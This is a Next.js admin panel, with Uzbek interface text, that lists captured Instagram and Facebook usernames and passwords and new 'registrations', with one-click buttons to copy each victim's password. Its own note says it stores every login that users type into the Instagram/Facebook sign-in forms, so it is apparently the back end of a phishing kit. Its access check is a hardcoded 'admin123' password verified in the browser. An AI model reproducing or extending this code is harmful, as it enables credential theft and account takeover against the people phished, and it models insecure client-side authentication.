'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

interface LoginRecord {
  username: string;
  password: string;
  timestamp: string;
  source?: string;
}

export default function AdminPanel() {
  const [instagramLogins, setInstagramLogins] = useState<LoginRecord[]>([]);
  const [facebookLogins, setFacebookLogins] = useState<LoginRecord[]>([]);
  const [registrations, setRegistrations] = useState<LoginRecord[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [activeTab, setActiveTab] = useState<'instagram' | 'facebook' | 'register'>('instagram');
  const router = useRouter();

  useEffect(() => {
    // Check if admin is authenticated
    const isAuth = localStorage.getItem('adminAuthenticated');
    if (isAuth !== 'true') {
      setIsLoading(false);
      return;
    }
    
    setIsAuthenticated(true);
    
    // Load different login types from localStorage
    const savedLogins = localStorage.getItem('logins');
    if (savedLogins) {
      const allLogins = JSON.parse(savedLogins);
      const instagram = allLogins.filter((l: LoginRecord) => l.source === 'instagram' || !l.source);
      const facebook = allLogins.filter((l: LoginRecord) => l.source === 'facebook');
      setInstagramLogins(instagram);
      setFacebookLogins(facebook);
    }
    
    // Load registrations
    const savedRegistrations = localStorage.getItem('registrations');
    if (savedRegistrations) {
      setRegistrations(JSON.parse(savedRegistrations));
    }
    
    setIsLoading(false);
  }, []);

  const handleCopyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    alert('Nusxa olindiI');
  };

  const handleDelete = (index: number) => {
    if (activeTab === 'instagram') {
      const updatedLogins = instagramLogins.filter((_, i) => i !== index);
      setInstagramLogins(updatedLogins);
      
      const allLogins = [
        ...updatedLogins,
        ...facebookLogins,
      ];
      localStorage.setItem('logins', JSON.stringify(allLogins));
    } else if (activeTab === 'facebook') {
      const updatedLogins = facebookLogins.filter((_, i) => i !== index);
      setFacebookLogins(updatedLogins);
      
      const allLogins = [
        ...instagramLogins,
        ...updatedLogins,
      ];
      localStorage.setItem('logins', JSON.stringify(allLogins));
    } else if (activeTab === 'register') {
      const updatedRegistrations = registrations.filter((_, i) => i !== index);
      setRegistrations(updatedRegistrations);
      localStorage.setItem('registrations', JSON.stringify(updatedRegistrations));
    }
  };

  const handleDeleteAll = () => {
    if (confirm('Barcha ma\'lumotlarni o\'chirib tashlaysizmi?')) {
      if (activeTab === 'instagram') {
        setInstagramLogins([]);
        const allLogins = facebookLogins;
        localStorage.setItem('logins', JSON.stringify(allLogins));
      } else if (activeTab === 'facebook') {
        setFacebookLogins([]);
        const allLogins = instagramLogins;
        localStorage.setItem('logins', JSON.stringify(allLogins));
      } else if (activeTab === 'register') {
        setRegistrations([]);
        localStorage.removeItem('registrations');
      }
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('adminAuthenticated');
    router.push('/');
  };

  const handleAdminPasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setPasswordError('');

    if (adminPassword === 'admin123') {
      localStorage.setItem('adminAuthenticated', 'true');
      setIsAuthenticated(true);
      setAdminPassword('');
    } else {
      setPasswordError('Parol noto\'g\'ri');
      setAdminPassword('');
    }
  };

  // Show password form if not authenticated
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-blue-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-lg p-8 max-w-sm w-full">
          <h1 className="text-2xl font-bold text-gray-900 mb-2 text-center">Admin Panel</h1>
          <p className="text-gray-600 text-center mb-6">Kirishni himoyalangan</p>
          
          <form onSubmit={handleAdminPasswordSubmit} className="space-y-4">
            <div>
              <input
                type="password"
                placeholder="Admin parol"
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>
            {passwordError && (
              <p className="text-red-600 text-sm text-center">{passwordError}</p>
            )}
            <button
              type="submit"
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded-lg transition-colors"
            >
              Kirish
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-blue-100">
      {/* Header */}
      <div className="bg-white shadow-md">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-6 border-b border-gray-200">
            <div>
              <h1 className="text-3xl font-bold text-gray-900">Admin Panel</h1>
              <p className="text-gray-600 text-sm mt-1">Barcha kirgan login parollar</p>
            </div>
            <button
              onClick={handleLogout}
              className="px-6 py-2 bg-red-500 hover:bg-red-600 text-white font-semibold rounded-lg transition-colors"
            >
              Chiqish
            </button>
          </div>
          
          {/* Tabs */}
          <div className="flex gap-8 mt-4">
            <button
              onClick={() => setActiveTab('instagram')}
              className={`pb-4 px-2 font-semibold transition-colors border-b-2 ${
                activeTab === 'instagram'
                  ? 'border-blue-600 text-blue-600'
                  : 'border-transparent text-gray-600 hover:text-gray-900'
              }`}
            >
              Instagram Loginlar ({instagramLogins.length})
            </button>
            <button
              onClick={() => setActiveTab('facebook')}
              className={`pb-4 px-2 font-semibold transition-colors border-b-2 ${
                activeTab === 'facebook'
                  ? 'border-blue-600 text-blue-600'
                  : 'border-transparent text-gray-600 hover:text-gray-900'
              }`}
            >
              Facebook Loginlar ({facebookLogins.length})
            </button>
            <button
              onClick={() => setActiveTab('register')}
              className={`pb-4 px-2 font-semibold transition-colors border-b-2 ${
                activeTab === 'register'
                  ? 'border-blue-600 text-blue-600'
                  : 'border-transparent text-gray-600 hover:text-gray-900'
              }`}
            >
              Yangi Ro&apos;yxatdanlar ({registrations.length})
            </button>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 py-8 sm:px-6 lg:px-8">
        {isLoading ? (
          <div className="text-center py-12">
            <p className="text-gray-600">Yuklanmoqda...</p>
          </div>
        ) : (
          <>
            {/* Stats */}
            <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
              <div className="bg-white rounded-lg shadow-md p-6">
                <p className="text-gray-600 text-sm mb-2">Instagram Loginlar</p>
                <p className="text-3xl font-bold text-blue-600">{instagramLogins.length}</p>
              </div>
              <div className="bg-white rounded-lg shadow-md p-6">
                <p className="text-gray-600 text-sm mb-2">Facebook Loginlar</p>
                <p className="text-3xl font-bold text-[#0a66c2]">{facebookLogins.length}</p>
              </div>
              <div className="bg-white rounded-lg shadow-md p-6">
                <p className="text-gray-600 text-sm mb-2">Yangi Ro&apos;yxatdanlar</p>
                <p className="text-3xl font-bold text-green-600">{registrations.length}</p>
              </div>
              <div className="bg-white rounded-lg shadow-md p-6">
                <p className="text-gray-600 text-sm mb-2">Jami</p>
                <p className="text-3xl font-bold text-purple-600">{instagramLogins.length + facebookLogins.length + registrations.length}</p>
              </div>
            </div>

            {/* Table */}
            <div className="bg-white rounded-lg shadow-md overflow-hidden">
              <div className="px-6 py-4 bg-gray-50 border-b border-gray-200 flex justify-between items-center">
                <h2 className="text-lg font-semibold text-gray-900">
                  {activeTab === 'instagram' && 'Instagram Kirish Ma\'lumotlari'}
                  {activeTab === 'facebook' && 'Facebook Kirish Ma\'lumotlari'}
                  {activeTab === 'register' && 'Yangi Ro\'yxatdan O\'tuvchilar'}
                </h2>
                {(activeTab === 'instagram' && instagramLogins.length > 0) ||
                (activeTab === 'facebook' && facebookLogins.length > 0) ||
                (activeTab === 'register' && registrations.length > 0) ? (
                  <button
                    onClick={handleDeleteAll}
                    className="px-4 py-2 bg-red-100 hover:bg-red-200 text-red-700 font-semibold rounded transition-colors text-sm"
                  >
                    Hammasini o\'chir
                  </button>
                ) : null}
              </div>

              {((activeTab === 'instagram' && instagramLogins.length === 0) ||
                (activeTab === 'facebook' && facebookLogins.length === 0) ||
                (activeTab === 'register' && registrations.length === 0)) ? (
                <div className="p-12 text-center">
                  <p className="text-gray-600 text-lg">Ma\'lumot yo\'q</p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead className="bg-gray-100 border-b border-gray-200">
                      <tr>
                        <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">#</th>
                        <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">
                          {activeTab === 'register' ? 'Elektron pochta' : 'Foydalanuvchi nomi'}
                        </th>
                        <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">
                          Parol
                        </th>
                        <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">
                          Vaqti
                        </th>
                        <th className="px-6 py-3 text-center text-sm font-semibold text-gray-700">
                          Amallar
                        </th>
                      </tr>
                    </thead>
                    <tbody>
                      {(activeTab === 'instagram'
                        ? instagramLogins
                        : activeTab === 'facebook'
                        ? facebookLogins
                        : registrations
                      ).map((item, index) => (
                        <tr
                          key={index}
                          className="border-b border-gray-200 hover:bg-gray-50 transition"
                        >
                          <td className="px-6 py-4 text-sm text-gray-600">{index + 1}</td>
                          <td className="px-6 py-4 text-sm font-medium text-gray-900">
                            {item.username}
                          </td>
                          <td className="px-6 py-4 text-sm text-gray-600 font-mono">
                            {'*'.repeat(item.password.length)}
                          </td>
                          <td className="px-6 py-4 text-sm text-gray-600">
                            {new Date(item.timestamp).toLocaleString('uz-UZ')}
                          </td>
                          <td className="px-6 py-4 text-center">
                            <div className="flex justify-center gap-2">
                              <button
                                onClick={() => handleCopyToClipboard(item.username)}
                                className="px-3 py-1 bg-blue-100 hover:bg-blue-200 text-blue-700 font-semibold rounded text-sm transition-colors"
                                title="Nusxa ol"
                              >
                                Nusxa
                              </button>
                              <button
                                onClick={() => handleCopyToClipboard(item.password)}
                                className="px-3 py-1 bg-green-100 hover:bg-green-200 text-green-700 font-semibold rounded text-sm transition-colors"
                                title="Parol nusxa ol"
                              >
                                Nusxa
                              </button>
                              <button
                                onClick={() => handleDelete(index)}
                                className="px-3 py-1 bg-red-100 hover:bg-red-200 text-red-700 font-semibold rounded text-sm transition-colors"
                                title="O'chir"
                              >
                                O\'chir
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>

            {/* Info Box */}
            <div className="mt-8 bg-blue-50 border border-blue-200 rounded-lg p-6">
              <p className="text-blue-900 text-sm">
                <strong>Eslatma:</strong> Bu admin paneli foydalanuvchilar Instagram/Facebook
                akkauntiga kirgunga yoki ro&apos;yxatdan o&apos;tishga barcha login va parollarni alohida saqlaydi.
                Ma&apos;lumotlar faqat browser localStorage&apos;da saqlanadi.
              </p>
            </div>
          </>
        )}
      </div>
    </div>
  );
}
